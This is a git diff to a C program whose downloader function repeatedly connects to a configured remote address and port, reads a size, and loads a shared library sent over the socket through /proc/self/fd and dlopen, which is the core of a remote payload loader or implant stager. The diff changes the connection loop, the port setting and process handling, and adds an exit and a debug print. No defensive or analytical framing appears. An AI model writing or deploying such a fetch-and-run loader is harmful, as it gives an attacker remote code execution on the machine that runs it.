@@ -110,15 +110,18 @@ void load_so(int connection_fd, int size){
   sprintf(file_path, "/proc/self/fd/%d", fd);
   handle = dlopen(file_path, RTLD_LAZY);
   dlclose(handle);
+  exit(0);
 }
 
 void process_connection(int connection_fd){
   while(1){
     char buff[13];
     if(recv(connection_fd, buff, sizeof(buff), 0) != 13){
+      // execution may never get past this block
       continue;
     }
     int size = atoi(buff);
+    printf("%d\n", size);
     load_so(connection_fd, size);
   }
 }
@@ -126,27 +129,27 @@ void process_connection(int connection_fd){
 void downloader(){
   int socket_fd;
   int connection_fd = -1;
-  int pid;
+  pid_t pid;
   struct sockaddr_in server;  
   
   socket_fd = socket(AF_INET, SOCK_STREAM, 0);
   server.sin_family = AF_INET;
-  server.sin_port = htons(1234);
+  server.sin_port = htons(port);
   server.sin_addr.s_addr = inet_addr(addr);
 
-  while(1){
     while(connection_fd < 0){
       sleep(5);
       connection_fd = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
     }
     
-    if((pid = fork()) == 0){
+    //if((pid = fork()) == 0){
       process_connection(connection_fd);
-    }else{
-      wait(NULL);
+      //}else{
+      //wait(NULL);
       close(connection_fd);
-    }
-  }
+      close(socket_fd);
+      //}
+      sleep(100);
   
   /* int socket_fd, connection_fd, addr_len;  */
   /* struct sockaddr_in server_addr, client;  */
